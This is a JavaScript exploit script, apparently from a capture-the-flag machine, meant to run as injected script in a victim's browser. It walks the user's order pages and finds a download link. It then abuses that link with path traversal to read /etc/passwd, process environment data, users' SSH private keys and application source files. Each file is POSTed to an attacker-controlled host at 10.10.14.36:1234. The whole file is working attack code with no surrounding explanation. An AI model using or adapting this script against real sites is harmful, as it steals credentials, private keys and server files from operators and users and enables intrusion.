const IP = "10.10.14.36";
const PORT = 1234;

async function sendResponse(resp) {
    fetch(`http://${IP}:${PORT}`, {method: "POST", body: resp});
}

async function getPage(uri) {
    var url = `http://${window.location.host}${uri}`;
    var response = await fetch(url);
    return response.text();
}

async function parseOrders(html) {
    var ordersUri = [];
    var profile = document.createElement("html");
    profile.innerHTML = html;
    var profileLinks = profile.getElementsByTagName("a");

    for(var linkTag of profileLinks) {
        if(!linkTag.href.includes('order')) {
            continue;
        }
        var orderUri = linkTag.getAttribute("href", 2);
        ordersUri.push(orderUri);
    }
    return ordersUri;
}

async function getDownloadLink(orderPage) {
    var order = document.createElement("html");
    order.innerHTML = orderPage;
    var orderLinks = order.getElementsByTagName("a");

    for(var orderLink of orderLinks) {
        if(orderLink.href.includes("download")) {
            return orderLink.href;
        }
    }
}

async function sendFile(fileUri) {
    var url = `http://${window.location.host}${fileUri}`;
    var response = await fetch(url);
    var blob = await response.blob();
    
    var reader = new FileReader();
    reader.onloadend = async function() {
        var data = reader.result;
        var responseObject = {uri: fileUri, blob: data};
        var response = JSON.stringify(responseObject);
        sendResponse(response);
    }

    reader.readAsDataURL(blob);
}

async function exploitDownloadLink(downloadLink) {
    var downloadURI = downloadLink.split(".htb")[1];
    var paths = [
        "/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/home/frank/.ssh/id_rsa",
        "/home/neil/.ssh/id_rsa", "/proc/self/exe", "/etc/hosts", "/proc/self/cwd/config.json",
        "/proc/self/cwd/index.js", "/proc/self/cwd/database.js", "/proc/self/cwd/utils.js"
    ];
    for(var path of paths) {
        var finalUri = downloadURI + "&bookIds=../../../../../../../.." + path;
        sendFile(finalUri);
    }
}

async function main() {
    var profile = await getPage("/profile");
    var orders = await parseOrders(profile);
    for(var order of orders) {
        var orderPage = await getPage(order);
        var downloadLink = await getDownloadLink(orderPage);
        if(downloadLink) {
            exploitDownloadLink(downloadLink);
            break;
        }
    }
    sendResponse("Done");
}

try {
    main();
} catch(err) {
    sendResponse(err);
}
